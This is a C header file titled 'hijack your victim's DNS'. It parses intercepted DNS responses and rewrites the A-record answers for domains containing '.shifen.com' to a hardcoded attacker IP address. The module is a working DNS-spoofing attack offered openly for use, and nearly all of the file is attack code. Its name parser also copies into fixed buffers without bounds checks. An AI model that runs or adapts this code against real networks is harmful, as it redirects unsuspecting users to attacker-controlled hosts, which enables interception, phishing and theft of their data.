/*
* MODULE: hijack your victim's DNS
* MAIN FUNCTION: DNSHijack
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __DNS_HIJACK_H_
#define __DNS_HIJACK_H_

#include "head.h"

#define DNS_A  0x01
#define DNS_CNAME 0x05

/* DNS packet head */
typedef struct {
    u_short id;
    u_short tag;
    u_short num_question;
    u_short num_answer;
    u_short num_authority;
    u_short num_appendix;
} dns_header;

/* get domain name in the buf */
void parse_dns_name(u_char *buf, u_char *p, char *name, int *len) {

    int flag;
    char *pos = name + *len;

    while (1) {

        /* end */
        flag = (int)p[0];
        if (flag == 0)
            break;

        /* judge pointers */
        if ((flag & 0xc0) == 0xc0) {
            p = buf + (int)p[1];
            parse_dns_name(buf, p, name, len);
            break;
        }
        /* copy */
        else {
            p += 1;
            memcpy(pos, p, flag);
            pos += flag;
            p += flag;
            *len += flag;
            if ((int)p[0] != 0) {
                memcpy(pos, ".", 1);
                pos += 1;
                *len += 1;
            }
        }
    }
}

int DNSHijack(u_char *buf) {

    /* definations */
    dns_header DNS;
    char cname[128] , aname[128] , ip[20];
    u_char netip[4];
    int count, len, type, data_len;
    u_char fake_ip[4] = {45,78,50,42};

    /* parse head */
    memcpy(&DNS, buf, 12);
    u_char *p = buf + 12;

    /* move over questions */
    int flag;
    for (count = 0; count < ntohs(DNS.num_question); count++) {
        while (1) {
            flag = (int)p[0];
            p += (flag + 1);
            if (flag == 0)
                break;
        }
        p += 4;
    }

    /* parse answers */
    //printf("\nGet DNS response:\n");
    for (count = 0; count < ntohs(DNS.num_answer); count++) {
        bzero(aname , sizeof(aname));
        len = 0;
        parse_dns_name(buf , p , aname , &len);
        p += 2;
        type = htons(*((u_short*)p));
		p += 8;
		data_len = ntohs(*((u_short*)p));
		p += 2;

        if (type == DNS_A) {
            bzero(ip , sizeof(ip));
            if (data_len == 4 && strstr(aname, ".shifen.com") != NULL) {
                memcpy(p, fake_ip, 4);
                memcpy(netip, p, data_len);
                inet_ntop(AF_INET, netip, ip, sizeof(struct sockaddr));
                //printf("Domain name: %s\n", aname);
                //printf("IP address: %s\n", ip);
            }
        }
        p += data_len;
    }
    return 0;
}


#endif